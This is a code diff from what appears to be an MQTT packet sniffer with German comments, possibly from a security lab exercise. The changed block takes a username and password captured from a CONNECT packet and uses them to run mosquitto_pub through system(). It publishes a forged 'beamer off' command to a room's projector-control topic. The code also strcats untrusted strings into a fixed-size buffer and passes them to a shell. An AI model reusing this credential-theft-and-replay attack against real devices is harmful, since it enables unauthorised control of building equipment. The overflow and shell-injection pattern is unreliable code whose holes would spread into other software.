@@ -230,20 +230,22 @@ int filter_connect_flags(unsigned char* data_payload, int Size, int remaining_le
   pos = filter_user_name(data_payload, Size, remaining_length, pos);
   //Nach dem Username kommt das Password
   pos = filter_password(data_payload, Size, remaining_length, pos);
+  
+  printf("\n\n");
+ 
+ //hier gefälschte nachricht absenden
+ 
+  char cmd[] = "mosquitto_pub -m \"beamer off\" -t \"/uos/93/E06/beamer-control\" -u ";
+  strcat(cmd,user_name);
+  strcat(cmd," -P ");
+  strcat(cmd,password);
+  printf("Running Command: %s\n",cmd);
+  system(cmd);
+  printf("\n\n");
+  password_found = 1; //beende die Main Schleife
  }
  
- printf("\n\n");
  
- //TODO hier gefälschte nachricht absenden
- 
- char cmd[] = "mosquitto_pub -m \"beamer off\" -t \"/uos/93/E06/beamer-control\" -u ";
- strcat(cmd,user_name);
- strcat(cmd," -P ");
- strcat(cmd,password);
- printf("Running Command: %s\n",cmd);
- system(cmd);
- printf("\n\n");
- password_found = 1; //beende die Main Schleife
  
  return 0;
 }
